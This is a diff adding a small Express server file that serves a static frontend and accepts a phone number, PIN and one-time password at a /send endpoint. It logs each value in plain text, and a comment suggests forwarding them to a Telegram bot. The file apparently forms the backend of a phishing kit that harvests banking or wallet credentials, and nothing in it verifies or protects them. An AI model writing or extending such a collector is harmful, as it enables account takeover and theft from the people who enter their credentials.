@@ -1,0 +1,31 @@
+// server.js
+const express = require('express');
+const path = require('path');
+const bodyParser = require('body-parser');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Parse JSON from requests
+app.use(bodyParser.json());
+
+// Serve static files (your frontend HTML and assets)
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Endpoint to receive login/PIN/OTP
+app.post('/send', (req, res) => {
+  const { phone, pin, otp } = req.body;
+
+  console.log('Received data:');
+  console.log('Phone:', phone);
+  console.log('PIN:', pin);
+  console.log('OTP:', otp);
+
+  // Here you can add integration with a database or Telegram bot
+  res.json({ status: 'success', message: 'Data received' });
+});
+
+// Start the server
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
